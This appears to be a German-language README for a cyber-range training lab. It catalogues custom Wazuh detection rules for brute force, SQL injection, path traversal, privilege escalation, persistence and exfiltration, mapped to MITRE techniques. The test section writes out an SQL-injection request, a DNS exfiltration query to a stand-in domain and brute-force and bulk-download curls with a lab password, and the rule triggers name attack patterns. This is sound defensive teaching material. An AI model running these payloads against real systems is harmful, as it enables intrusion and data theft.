# Cyber-Range-Lab — Custom Wazuh Detection Rules
> Version: 0.1 (Pilot) · Regel-ID-Range: 100000–100999

## Lernziel-Mapping

| Level | Lernziel | Regel-IDs | CySA+-Bezug |
|-------|----------|-----------|-------------|
| L1 | Brute-Force Detection (SSH + HTTP) | 100010, 100011, 100020 | D1 SIEM Use Cases |
| L2 | Web Exploit Patterns (SQLi, LFI, Nextcloud) | 100030, 100040, 100091 | D1 Threat Hunting |
| L3 | Privilege Escalation + Persistence | 100050, 100060, 100061 | D1 + D3 Host Detection |
| L4 | Lateral Movement + Exfiltration | 100070, 100080, 100090, 100092 | D3 IR + Forensics |

---

## Regel-Katalog

### 100010 — SSH-Brute-Force (L1)
- **Level**: 10
- **Trigger**: >5 SSH-Fehlversuche innerhalb 60s
- **Technik**: Frequenz-Regel auf Basis von Rule 5710 (SSH-Auth-Failure)
- **Datei**: `100010-ssh-brute.xml`
- **MITRE**: T1110 (Brute Force)

### 100011 — SSH-Login nach Brute-Force (L1)
- **Level**: 12
- **Trigger**: SSH-Root-Login nach >5 Fehlversuchen innerhalb 120s
- **Technik**: Korrelations-Regel (Erfolg nach Misserfolgen)
- **Datei**: `100010-ssh-brute.xml`
- **MITRE**: T1078 (Valid Accounts)

### 100020 — HTTP-Brute-Force-Spike (L1)
- **Level**: 8
- **Trigger**: >10 HTTP 401 in 60s (wp-login, Juice-Shop-Login)
- **Datei**: `100020-web-brute.xml`
- **MITRE**: T1110 (Brute Force)

### 100030 — SQL-Injection Detection (L2)
- **Level**: 10
- **Trigger**: SQLi-Patterns in HTTP-Requests (UNION SELECT, OR 1=1, sqlmap, etc.)
- **Datei**: `100030-sqli.xml`
- **MITRE**: T1190 (Exploit Public-Facing Application)

### 100040 — LFI/RFI Detection (L2)
- **Level**: 8
- **Trigger**: Path-Traversal-Patterns in URLs (`../`, `/etc/passwd`, `php://`)
- **Datei**: `100040-lfi.xml`
- **MITRE**: T1190 (Exploit Public-Facing Application)

### 100050 — SUID-Binary Execution (L3)
- **Level**: 10
- **Trigger**: Ausführung von `/usr/local/bin/suid-helper` oder SUID-find
- **Datei**: `100050-suid.xml`
- **MITRE**: T1548 (Abuse Elevation Control Mechanism)

### 100060 — Cron-Persistence (L3)
- **Level**: 8
- **Trigger**: Änderung an Crontab/Cron-Verzeichnissen
- **Datei**: `100060-cron.xml`
- **MITRE**: T1053 (Scheduled Task/Job)

### 100061 — SSH-Key-Persistence (L3)
- **Level**: 12
- **Trigger**: >3 SSH-Key-Accept-Logins innerhalb 600s (Key-Drop detektiert)
- **Datei**: `100060-cron.xml`
- **MITRE**: T1098 (Account Manipulation)

### 100070 — Lateral Movement via SSH (L4)
- **Level**: 10
- **Trigger**: SSH-Accept von neuer/unerwarteter Quelle
- **Datei**: `100070-lateral.xml`
- **MITRE**: T1021 (Remote Services)

### 100080 — DNS-Tunneling/Exfiltration (L4)
- **Level**: 12
- **Trigger**: >50 DNS-Queries pro Minute zu verdächtigen Domains
- **Datei**: `100080-dns-exfil.xml`
- **MITRE**: T1048 (Exfiltration Over Alternative Protocol)

### 100090 — Nextcloud-Brute-Force (L1)
- **Level**: 10
- **Trigger**: >10 Nextcloud-Login-Versuche in 60s
- **Datei**: `100090-nc-brute.xml`
- **MITRE**: T1110 (Brute Force)

### 100091 — Nextcloud-Exploit-Detection (L2)
- **Level**: 10
- **Trigger**: Nextcloud-Exploit-Patterns (Identity-Proof, Status-Endpunkte)
- **Datei**: `100091-nc-exploit.xml`
- **MITRE**: T1190 (Exploit Public-Facing Application)

### 100092 — Nextcloud-Massen-Exfiltration (L4)
- **Level**: 12
- **Trigger**: >20 WebDAV/Share-Downloads in 120s
- **Datei**: `100092-nc-exfil.xml`
- **MITRE**: T1048 (Exfiltration Over Alternative Protocol)

---

## Deployment

Die Custom-Rules werden via Ansible deployt:
- **Manager-Pfad**: `/var/ossec/etc/rules/custom/*.xml`
- **Agent-Konfig**: in `/var/ossec/etc/ossec.conf`, managed via `21-wazuh-agents.yml`

Nach Deployment muss der Wazuh-Manager die Rules neu laden:
```bash
/var/ossec/bin/wazuh-control restart
# oder via API:
curl -k -X POST https://10.99.20.2:55000/manager/files
```

## Test der Rules

1. SSH-Brute-Force: `ssh root@10.99.10.2` mit falschem PW >5x
2. SQLi: `curl "http://10.99.10.2:8080/?id=1' OR '1'='1"`
3. SUID: Auf linux-victim `./suid-helper` ausführen
4. DNS-Tunnel: `dig @8.8.8.8 test123.exfil.example.com`
5. NC-Brute-Force: Mehrere `curl -d "user=admin&password=falsch" http://10.99.10.5/login`
6. NC-Exfil: `curl -u "admin:123456789" http://10.99.10.5/remote.php/dav/files/admin/`
